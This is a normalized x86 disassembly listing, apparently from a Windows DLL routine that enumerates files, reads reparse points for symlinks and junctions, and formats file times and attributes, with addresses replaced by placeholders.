push 0xffffffff
push sub_1004d3f4
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax 0x4b74
call sub_10048ab0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x4b70 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4b88 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ esp + 0x18 ] ebx
mov edi [ ebp + 0x8 ]
lea ecx [ esp + 0xa8 ]
push 0x0
push edi
mov [ esp + 0x38 ] edi
call sub_100080c0
mov [ esp + 0x4b90 ] 0x0
cmp [ esp + 0xb0 ] 0x0
je r-xdata
mov edx [ edi ]
sub esp 0x18
mov eax esp
mov [ esp + 0x28 ] esp
mov ecx edi
push eax
call [ edx + 0x14 ]
mov [ esp + 0x4ba8 ] 0x2
mov [ esp + 0x4ba8 ] 0x0
call sub_10008500
add esp 0x18
test eax eax
jne r-xdata
mov eax [ ebx - 0x3c ]
lea ecx [ ebx - 0x3c ]
mov eax [ eax + 0x8 ]
add ecx eax
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
mov ecx [ esp + 0xac ]
sub esp 0x18
mov esi esp
mov [ esp + 0x28 ] esp
mov [ esp + 0x34 ] eax
mov ebx edx
mov edi [ ecx ]
push esi
call [ edi + 0x14 ]
mov [ esp + 0x4ba8 ] 0x1
push ebx
push [ esp + 0x38 ]
mov [ esp + 0x4bb0 ] 0x0
call sub_10008410
add esp 0x20
mov esi eax
jmp r-xdata
push 0x44
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ esp + 0x10 ] esi
mov [ esp + 0x4b90 ] 0x5
test esi esi
je r-xdata
push 0x24
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ esp + 0x10 ] esi
mov [ esp + 0x4b90 ] 0x3
test esi esi
je r-xdata
mov [ esp + 0x4b90 ] 0xffffffff
mov [ esp + 0xa8 ] r--data
mov [ esp + 0x4b90 ] 0x23
cmp [ esp + 0xc4 ] 0x0
jbe r-xdata
xor esi esi
sub esp 0x18
mov ecx esp
mov [ esp + 0x2c ] esp
push ecx
lea ecx [ ebx - 0x3c ]
call sub_1000fd60
mov [ esp + 0x4ba8 ] 0x6
sub esp 0x18
mov edx [ edi ]
mov eax esp
mov [ esp + 0x4c ] esp
mov ecx edi
push eax
call [ edx + 0x14 ]
mov [ esp + 0x4bc0 ] 0x7
mov [ esp + 0x4bc0 ] 0x5
mov ecx esi
call sub_1000df40
mov esi eax
jmp r-xdata
sub esp 0x18
mov ecx esp
mov [ esp + 0x2c ] esp
push ecx
lea ecx [ ebx - 0x3c ]
call sub_1000fd60
mov [ esp + 0x4ba8 ] 0x4
mov [ esp + 0x4ba8 ] 0x3
mov ecx esi
call sub_1000dc20
mov esi eax
jmp r-xdata
mov [ esp + 0x4b90 ] 0xffffffff
cmp [ esp + 0xc8 ] 0x8
jb r-xdata
cmp [ esp + 0xc8 ] 0x8
lea eax [ esp + 0xb4 ]
cmovae eax [ esp + 0xb4 ]
push eax
call [ SetCurrentDirectoryW@IAT ]
mov ebx [ rw-data ]
push 0x2c
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ esp + 0x10 ] edi
mov [ esp + 0x4b90 ] 0x8
test edi edi
je r-xdata
mov ecx 0xc
call sub_100383b0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov [ esp + 0x4b90 ] 0x0
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ esp + 0xc8 ] 0x7
mov [ esp + 0xb4 ] ax
mov eax esi
mov [ esp + 0xc4 ] 0x0
mov ecx [ esp + 0x4b88 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x4b70 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
push [ esp + 0xb4 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
push 0x0
sub esp 0x18
mov ecx esp
mov [ esp + 0x30 ] esp
push ebx
call sub_10009370
mov [ esp + 0x4bac ] 0x9
mov [ esp + 0x4bac ] 0x8
mov ecx edi
call sub_1002b560
jmp r-xdata
xor edi edi
mov [ esp + 0x24 ] edi
push 0x0
sub esp 0x18
mov ecx esp
mov [ esp + 0x30 ] esp
push ebx
call sub_10009370
mov [ esp + 0x4bac ] 0xb
mov [ esp + 0x4bac ] 0xa
mov ecx edi
call sub_1002b560
mov edi eax
mov [ esp + 0x24 ] eax
jmp r-xdata
mov [ esp + 0x20 ] eax
mov [ esp + 0x4b90 ] 0x0
push 0x2c
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ esp + 0x10 ] edi
mov [ esp + 0x4b90 ] 0xa
test edi edi
je r-xdata
test esi esi
je r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x4 ]
test eax eax
je r-xdata
mov [ esp + 0x4b90 ] 0x0
mov ebx [ esp + 0x20 ]
mov ecx ebx
mov eax [ ebx ]
call [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebx ]
mov ecx ebx
push 0x1
call [ eax ]
test edi edi
je r-xdata
mov eax [ esi ]
mov ecx esi
push 0x1
call [ eax ]
sub esp 0x18
mov ecx esp
mov [ esp + 0x28 ] esp
push r--data
call sub_10009370
mov [ esp + 0x4ba8 ] 0xd
mov eax [ esp + 0x30 ]
add eax 0xffffffc4
push ebx
mov [ esp + 0x38 ] eax
push esi
mov [ esp + 0x4bb0 ] 0x0
mov ecx eax
call sub_1000f230
mov eax [ esi ]
mov ecx esi
call [ eax + 0x8 ]
mov edx [ esi ]
mov ecx esi
push 0x1
mov edi eax
call [ edx ]
test edi edi
je r-xdata
push 0x94
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ esp + 0x34 ] esi
mov [ esp + 0x4b90 ] 0xc
test esi esi
je r-xdata
mov eax [ edi ]
mov ecx edi
push 0x1
call [ eax ]
mov edi [ esp + 0x18 ]
test [ edi - 0x20 ] 0x1
je r-xdata
mov edx [ ebx ]
mov ecx ebx
push 0x1
call [ edx ]
mov ecx [ esp + 0x24 ]
push 0x1
mov eax [ ecx ]
call [ eax ]
mov ecx [ esp + 0x1c ]
push edi
mov eax [ ecx ]
mov ecx [ esp + 0x1c ]
add ecx 0xffffffc4
mov eax [ eax + 0xc ]
add ecx eax
call sub_10007da0
mov esi eax
jmp r-xdata
xor ecx ecx
mov eax [ esp + 0x18 ]
mov ecx [ eax - 0x3c ]
add eax 0xffffffc4
mov ecx [ ecx + 0x8 ]
add ecx eax
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx esi
call sub_10018c90
mov ecx eax
jmp r-xdata
push ebx
lea ecx [ edi - 0x3c ]
call sub_1000fde0
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0xc ]
mov ecx eax
xor esi esi
mov eax 0x76b981db
mov [ esp + 0x20 ] esi
mul ecx
xor ecx ecx
mov [ esp + 0x18 ] esi
mov eax edx
mov [ esp + 0x38 ] ecx
shr eax 0x8
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
mov ecx [ esp + 0x30 ]
sub esp 0x18
mov eax esp
mov [ esp + 0x28 ] esp
mov edx [ ecx ]
push eax
call [ edx + 0x14 ]
mov [ esp + 0x4ba8 ] 0xe
mov [ esp + 0x4ba8 ] 0x0
call sub_10008500
add esp 0x18
test eax eax
jne r-xdata
mov [ esp + 0x4b90 ] 0x0
mov eax [ ecx ]
mov [ ecx + 0x10 ] 0x31
mov esi [ eax + 0x8 ]
add esi ecx
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ esp + 0x1c ] edx
push 0x44
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ esp + 0x10 ] esi
mov [ esp + 0x4b90 ] 0x13
test esi esi
je r-xdata
push 0x24
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ esp + 0x10 ] esi
mov [ esp + 0x4b90 ] 0xf
test esi esi
je r-xdata
push [ esp + 0x18 ]
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x784 ]
push eax
call sub_1000cf80
add esp 0xc
push 0x94
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ esp + 0x34 ] esi
mov [ esp + 0x4b90 ] 0x20
test esi esi
je r-xdata
mov ecx 0x2d
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
cmp ecx [ edi - 0x10 ]
jb r-xdata
cmp [ esp + 0x18 ] eax
jae r-xdata
xor esi esi
sub esp 0x18
mov ecx esp
mov [ esp + 0x2c ] esp
push r--data
call sub_10009370
mov [ esp + 0x4ba8 ] 0x14
sub esp 0x18
mov ecx [ esp + 0x60 ]
mov eax esp
mov [ esp + 0x4c ] esp
push eax
mov edx [ ecx ]
call [ edx + 0x14 ]
mov [ esp + 0x4bc0 ] 0x15
mov [ esp + 0x4bc0 ] 0x13
mov ecx esi
call sub_1000df40
mov esi eax
jmp r-xdata
xor esi esi
sub esp 0x18
mov ecx esp
mov [ esp + 0x2c ] esp
push r--data
call sub_10009370
mov [ esp + 0x4ba8 ] 0x10
mov [ esp + 0x4ba8 ] 0xf
mov ecx esi
call sub_1000dc20
mov esi eax
jmp r-xdata
xor edi edi
mov ecx [ edi - 0x3c ]
add edi 0xffffffc4
mov ecx [ ecx + 0x8 ]
add ecx edi
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx esi
call sub_10018c90
mov edi eax
jmp r-xdata
inc ecx
add edx 0x228
mov [ esp + 0x38 ] ecx
mov [ esp + 0x1c ] edx
cmp ecx [ esp + 0x10 ]
jb r-xdata
mov eax [ ebx ]
lea ecx [ esp + 0x12c ]
push 0x228
push ecx
push edx
mov ecx ebx
call [ eax + 0x14 ]
mov [ esp + 0x68 ] 0x0
mov [ esp + 0x6c ] 0x0
mov [ esp + 0x6c ] 0xf
mov [ esp + 0x68 ] 0x0
mov [ esp + 0x58 ] 0x0
mov [ esp + 0x4b90 ] 0x18
test esi esi
je r-xdata
mov eax [ esi ]
mov ecx esi
push 0x1
call [ eax ]
mov [ esp + 0x4b90 ] 0x0
sub esp 0x18
mov ecx esp
mov [ esp + 0x28 ] esp
push r--data
call sub_10009370
mov [ esp + 0x4ba8 ] 0x16
sub esp 0x18
mov ecx [ esp + 0x60 ]
mov eax esp
mov [ esp + 0x44 ] esp
push eax
mov edx [ ecx ]
call [ edx + 0x14 ]
mov [ esp + 0x4bc0 ] 0x17
push esi
push ebx
mov [ esp + 0x4bc8 ] 0x0
lea ecx [ edi - 0x3c ]
call sub_1000f440
test esi esi
je r-xdata
mov [ esp + 0x4b90 ] 0x0
sub esp 0x18
mov ecx esp
mov [ esp + 0x28 ] esp
push r--data
call sub_10009370
mov [ esp + 0x4ba8 ] 0x11
sub esp 0x18
mov ecx esp
mov [ esp + 0x44 ] esp
push r--data
call sub_10009370
mov [ esp + 0x4bc0 ] 0x12
jmp r-xdata
lea ecx [ esp + 0x77c ]
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov [ esp + 0x4b90 ] 0x0
sub esp 0x18
mov ecx [ esp + 0x48 ]
mov eax esp
mov [ esp + 0x4c ] esp
push eax
mov edx [ ecx ]
call [ edx + 0x14 ]
mov [ esp + 0x4ba8 ] 0x21
mov [ esp + 0x4ba8 ] 0x0
mov ecx edi
call sub_100190c0
mov [ edi + 0x10 ] 0x3e9
cmp [ esp + 0x77c ] 0x0
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x50 ] 0x0
mov [ esp + 0x50 ] 0xf
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x3c ] 0x0
jne r-xdata
mov eax [ edi - 0x14 ]
test eax eax
je r-xdata
sub esp 0x18
lea eax [ esp + 0x144 ]
mov ecx esp
mov [ esp + 0x2c ] esp
push eax
call sub_10009370
mov [ esp + 0x4ba8 ] 0x19
mov [ esp + 0x4ba8 ] 0x18
lea ecx [ esp + 0xe4 ]
call sub_1003c1b0
add esp 0x18
mov [ esp + 0x4b90 ] 0x1a
lea ecx [ esp + 0x58 ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0x4b90 ] 0x18
cmp [ esp + 0xe0 ] 0x10
jb r-xdata
push r--data
lea ecx [ esp + 0x5c ]
call sub_10005430
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ esp + 0x780 ]
push eax
lea ecx [ esp + 0x44 ]
call sub_100019e0
mov [ esp + 0x4b90 ] 0x22
lea ecx [ edi + 0x34 ]
lea eax [ esp + 0x3c ]
cmp ecx eax
je r-xdata
push 0x1
push r--data
lea ecx [ esp + 0x60 ]
mov [ esp + 0xe8 ] 0xf
mov [ esp + 0xe4 ] 0x0
mov [ esp + 0xd4 ] 0x0
call sub_10005470
push [ esp + 0x350 ]
lea eax [ esp + 0x380 ]
push [ esp + 0x350 ]
push r--data
push eax
call sub_1000cf80
add esp 0x10
cmp [ esp + 0x37c ] 0x0
jne r-xdata
push [ esp + 0xcc ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x4b90 ] 0x0
cmp [ esp + 0x50 ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
lea ecx [ esp + 0x37c ]
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov ecx [ edi + 0x18 ]
mov [ esp + 0x50 ] 0xf
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x3c ] 0x0
test ecx ecx
je r-xdata
push [ esp + 0x3c ]
call j_sub_1003f3e3#2
add esp 0x4
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ esp + 0x380 ]
push eax
lea ecx [ esp + 0x60 ]
call sub_10005470
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ esp + 0x24 ]
mov [ edi + 0x18 ] ecx
mov ecx ebx
mov eax [ ebx ]
push 0x1
call [ eax ]
mov eax [ edi ]
mov esi [ eax + 0x8 ]
add esi edi
jmp r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x380 ]
push 0x400
push eax
call sub_1003d191
add esp 0xc
lea eax [ esp + 0x37c ]
push r--data
push 0x400
push eax
call sub_1003d1e6
mov esi [ esp + 0x340 ]
add esp 0xc
mov [ esp + 0x358 ] 0x10
xor edx edx
mov [ esp + 0x35c ] 0x400
mov [ esp + 0x360 ] 0x10000
mov [ esp + 0x364 ] 0x4000
mov [ esp + 0x368 ] 0x40
mov [ esp + 0x36c ] 0x20
mov [ esp + 0x370 ] 0x4
mov [ esp + 0x374 ] 0x2
mov [ esp + 0x378 ] 0x1
mov ecx 0x2b
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
inc edx
cmp edx 0x9
jb r-xdata
mov [ esp + edx + 0x37c ] 0x2d
mov ecx [ esp + edx * 4 + 0x358 ]
mov eax ecx
and eax esi
cmp eax ecx
je r-xdata
cmp [ esp + 0x37c ] 0x0
jne r-xdata
lea ecx [ esp + 0x37c ]
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ esp + 0x380 ]
push eax
lea ecx [ esp + 0x60 ]
call sub_10005470
test [ edi - 0x20 ] 0x8
jne r-xdata
test [ esp + 0x334 ] 0x400
je r-xdata
mov ecx [ esp + 0x340 ]
mov eax [ esp + 0x33c ]
test ecx ecx
ja r-xdata
mov edx [ esp + 0x24 ]
lea ecx [ esp + 0x58 ]
cmp [ esp + 0x6c ] 0x10
push [ esp + 0x68 ]
cmovae ecx [ esp + 0x5c ]
mov eax [ edx ]
mov esi [ esp + 0x24 ]
push ecx
push esi
mov ecx edx
call [ eax + 0x10 ]
add esi [ esp + 0x68 ]
inc [ esp + 0x18 ]
mov [ esp + 0x20 ] esi
mov [ esp + 0x4b90 ] 0x0
cmp [ esp + 0x6c ] 0x10
jb r-xdata
push 0x0
push 0x2200000
push 0x3
push 0x0
push 0x1
push 0x80
lea eax [ esp + 0x144 ]
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov esi [ FileTimeToLocalFileTime@IAT ]
mov [ esp + 0x28 ] eax
lea eax [ esp + 0x28 ]
push eax
push eax
mov [ esp + 0x34 ] ecx
call esi
lea eax [ esp + 0x88 ]
push eax
lea eax [ esp + 0x2c ]
push eax
call [ FileTimeToSystemTime@IAT ]
mov eax [ esp + 0x344 ]
mov [ esp + 0x28 ] eax
mov eax [ esp + 0x348 ]
mov [ esp + 0x2c ] eax
lea eax [ esp + 0x28 ]
push eax
push eax
call esi
lea eax [ esp + 0x98 ]
push eax
lea eax [ esp + 0x2c ]
push eax
call [ FileTimeToSystemTime@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
jb r-xdata
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x1c ]
mov [ esp + 0x6c ] 0xf
mov [ esp + 0x68 ] 0x0
mov [ esp + 0x58 ] 0x0
push [ esp + 0x58 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x4000
lea eax [ esp + 0xb80 ]
mov [ esp + 0x18 ] 0x4000
push 0x0
push eax
call sub_10045ec0
add esp 0xc
lea eax [ esp + 0x14 ]
push 0x0
push eax
push 0x4000
lea eax [ esp + 0xb88 ]
push eax
push 0x0
push 0x0
push 0x900a8
push esi
call [ DeviceIoControl@IAT ]
test eax eax
je r-xdata
call sub_1000e2d0
push 0x0
push 0x2200000
push 0x3
push 0x0
push 0x1
push 0x80
lea eax [ esp + 0x144 ]
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
movzx eax [ esp + 0xa2 ]
push eax
movzx eax [ esp + 0xa4 ]
push eax
movzx eax [ esp + 0xa6 ]
push eax
movzx eax [ esp + 0xa6 ]
push eax
movzx eax [ esp + 0xa8 ]
push eax
movzx eax [ esp + 0xa6 ]
push eax
movzx eax [ esp + 0xa8 ]
push eax
movzx eax [ esp + 0xaa ]
push eax
movzx eax [ esp + 0xaa ]
push eax
movzx eax [ esp + 0xac ]
push eax
push ecx
lea eax [ esp + 0x3a8 ]
push eax
call sub_1000cf80
add esp 0x30
cmp [ esp + 0x37c ] 0x0
jne r-xdata
mov ecx 0x2c
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
cmp [ esp + 0x348 ] 0x0
ja r-xdata
test eax eax
jne r-xdata
push esi
call [ CloseHandle@IAT ]
xor eax eax
mov [ esp + 0x80 ] 0x0
mov [ esp + 0x84 ] 0x0
mov [ esp + 0x84 ] 0x7
mov [ esp + 0x80 ] 0x0
mov [ esp + 0x70 ] ax
mov [ esp + 0x4b90 ] 0x1b
mov eax [ esp + 0xb7c ]
cmp eax 0xa000000c
jne r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
lea ecx [ esp + 0x37c ]
lea edx [ ecx + 0x1 ]
lea ecx [ ecx ]
xor ecx ecx
jmp r-xdata
cmp [ esp + 0x344 ] 0x0
jbe r-xdata
cmp eax 0xa0000003
jne r-xdata
movzx eax [ esp + 0xb8a ]
lea ecx [ esp + 0xb90 ]
shr eax 0x1
push eax
movzx eax [ esp + 0xb8c ]
shr eax 0x1
lea eax [ ecx + eax * 2 ]
push eax
lea ecx [ esp + 0x11c ]
call sub_100103c0
mov [ esp + 0x4b90 ] 0x1c
lea ecx [ esp + 0x70 ]
push eax
call sub_10003670
mov [ esp + 0x4b90 ] 0x1b
lea ecx [ esp + 0x114 ]
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ esp + 0x380 ]
push eax
lea ecx [ esp + 0x60 ]
call sub_10005470
sub esp 0x18
xor eax eax
mov ecx esp
mov [ esp + 0x4c ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ esp + 0x90 ]
push eax
call sub_10003a20
mov [ esp + 0x4ba8 ] 0x1e
mov [ esp + 0x4ba8 ] 0x1b
lea ecx [ esp + 0xfc ]
call sub_1003c1b0
add esp 0x18
mov [ esp + 0x4b90 ] 0x1f
lea ecx [ esp + 0x58 ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0x4b90 ] 0x1b
cmp [ esp + 0xf8 ] 0x10
jb r-xdata
movzx eax [ esp + 0xb8a ]
lea ecx [ esp + 0xb8c ]
shr eax 0x1
push eax
movzx eax [ esp + 0xb8c ]
shr eax 0x1
lea eax [ ecx + eax * 2 ]
push eax
lea ecx [ esp + 0x104 ]
call sub_100103c0
mov [ esp + 0x4b90 ] 0x1d
lea ecx [ esp + 0x70 ]
push eax
call sub_10003670
mov [ esp + 0x4b90 ] 0x1b
lea ecx [ esp + 0xfc ]
call sub_100036b0
push r--data
lea ecx [ esp + 0x5c ]
mov [ esp + 0xfc ] 0xf
mov [ esp + 0xf8 ] 0x0
mov [ esp + 0xe8 ] 0x0
call sub_10005430
mov [ esp + 0x4b90 ] 0x18
cmp [ esp + 0x84 ] 0x8
jb r-xdata
push [ esp + 0xe4 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ esp + 0x84 ] 0x7
mov [ esp + 0x80 ] 0x0
mov [ esp + 0x70 ] ax
push [ esp + 0x70 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1000f230
push ebp
mov ebp esp
push 0xffffffff
push sub_1004d440
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x254 ] esi
mov edi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x250 ]
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x24 ] 0x8
jb r-xdata
lea esp [ esp ]
xor eax eax
mov [ ebp + 0x24 ] 0x7
mov [ ebp + 0x20 ] 0x0
mov [ ebp + 0x10 ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x20
push [ ebp + 0x10 ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx [ esi + 0x1c ]
test cl 0x2
je r-xdata
lea eax [ ebp - 0x250 ]
push r--data
push eax
call sub_1003d023
add esp 0x8
test eax eax
je r-xdata
test cl 0x4
je r-xdata
test al 0x10
jne r-xdata
mov eax [ edi ]
lea ecx [ ebp - 0x250 ]
push ecx
mov ecx edi
call [ eax + 0x4 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x250 ]
push r--data
push eax
call sub_1003d023
add esp 0x8
test eax eax
je r-xdata
cmp [ ebp + 0x20 ] 0x0
jbe r-xdata
test al 0x10
je r-xdata
mov eax [ ebp - 0x48 ]
test al 0x10
je r-xdata
mov eax [ ebp - 0x48 ]
mov esi [ ebx ]
lea eax [ ebp - 0x250 ]
push 0x228
push eax
mov ecx ebx
call [ esi + 0xc ]
push eax
mov ecx ebx
call [ esi + 0x10 ]
mov esi [ ebp - 0x254 ]
xor eax eax
mov [ ebp - 0x18 ] 0x0
push 0xffffffff
push eax
mov [ ebp - 0x28 ] ax
lea ecx [ ebp - 0x28 ]
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] 0x0
push eax
mov [ ebp - 0x14 ] 0x7
mov [ ebp - 0x18 ] 0x0
call sub_10003a20
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x28 ]
push 0x1
push r--data
call sub_10005dc0
cmp [ ebp - 0x250 ] 0x0
jne r-xdata
lea eax [ ebp - 0x250 ]
lea edx [ eax + 0x2 ]
xor eax eax
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ ebp - 0x250 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_10005dc0
cmp [ ebp - 0x14 ] 0x8
lea eax [ ebp - 0x28 ]
cmovae eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x250 ]
push 0x104
push eax
call sub_1003d249
add esp 0xc
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x14 ] 0x8
jb r-xdata
xor eax eax
mov [ ebp - 0x14 ] 0x7
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] ax
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1000f440
push ebp
mov ebp esp
push 0xffffffff
push sub_1004d568
mov eax [ fs : 0x0 ]
push eax
sub esp 0x334
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x33c ] ecx
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x338 ] eax
mov [ ebp - 0x334 ] ecx
mov [ ebp - 0x32c ] ebx
mov [ ebp - 0x4 ] 0x1
lea edx [ ebp - 0x328 ]
mov eax [ ecx ]
push edx
call [ eax + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x24 ] 0x8
jb r-xdata
lea esp [ esp ]
xor eax eax
mov [ ebp + 0x24 ] 0x7
mov [ ebp + 0x20 ] 0x0
mov [ ebp + 0x10 ] ax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x3c ] 0x8
jb r-xdata
push [ ebp + 0x10 ]
call j_sub_1003f3e3#2
add esp 0x4
xor bl bl
xor eax eax
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x44 ] 0x0
mov [ ebp - 0x44 ] 0x7
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x58 ] ax
cmp [ ebp - 0x328 ] ax
jne r-xdata
xor eax eax
mov [ ebp + 0x3c ] 0x7
mov [ ebp + 0x38 ] 0x0
mov [ ebp + 0x28 ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x38
push [ ebp + 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0x1
test al 0x1
je r-xdata
and eax 0xfffffffd
mov [ ebp - 0x32c ] eax
cmp [ ebp - 0x2c ] 0x8
jb r-xdata
lea ecx [ ebp - 0x328 ]
lea edx [ ecx + 0x2 ]
xor ecx ecx
jmp r-xdata
test bl bl
je r-xdata
and eax 0xfffffffe
mov [ ebp - 0x32c ] eax
cmp [ ebp - 0x44 ] 0x8
jb r-xdata
xor ecx ecx
mov [ ebp - 0x2c ] 0x7
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] cx
push [ ebp - 0x40 ]
call j_sub_1003f3e3#2
mov eax [ ebp - 0x32c ]
add esp 0x4
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
lea eax [ ebp - 0x328 ]
push eax
lea ecx [ ebp - 0x58 ]
call sub_10009730
mov [ ebp - 0x4 ] 0x2
or ebx 0x1
mov [ ebp - 0x32c ] ebx
lea ecx [ ebp - 0x58 ]
cmp [ ebp - 0x44 ] 0x8
mov esi 0x1
mov edi [ ebp - 0x48 ]
cmovae ecx [ ebp - 0x58 ]
cmp edi esi
cmovb esi edi
test esi esi
je r-xdata
mov esi [ ebp - 0x334 ]
lea ecx [ ebp - 0x328 ]
push ecx
mov ecx esi
mov eax [ esi ]
call [ eax + 0x4 ]
mov ebx [ ebp - 0x32c ]
test eax eax
jne r-xdata
xor eax eax
mov [ ebp - 0x18 ] 0x0
push 0xffffffff
push eax
mov [ ebp - 0x28 ] ax
lea ecx [ ebp - 0x28 ]
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] 0x0
push eax
mov [ ebp - 0x14 ] 0x7
mov [ ebp - 0x18 ] 0x0
call sub_10003a20
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x18 ] 0x0
jbe r-xdata
xor eax eax
mov [ ebp - 0x44 ] 0x7
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x58 ] ax
push [ ebp - 0x58 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov edx r--data
test [ ebp - 0x120 ] 0x10
je r-xdata
cmp [ ebp - 0x328 ] 0x0
jne r-xdata
push 0x1
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10005dc0
sete al
test al al
sete al
test al al
je r-xdata
cmp edi 0x1
jae r-xdata
movzx eax [ ecx ]
cmp ax [ edx ]
sbb eax eax
and eax 0xfffffffe
inc eax
jmp r-xdata
add ecx 0x2
add edx 0x2
dec esi
jne r-xdata
lea ecx [ ebp - 0x328 ]
lea edx [ ecx + 0x2 ]
xor ecx ecx
jmp r-xdata
xor eax eax
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x2c ] 0x7
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] ax
cmp [ ebp - 0x328 ] ax
jne r-xdata
xor eax eax
cmp edi 0x1
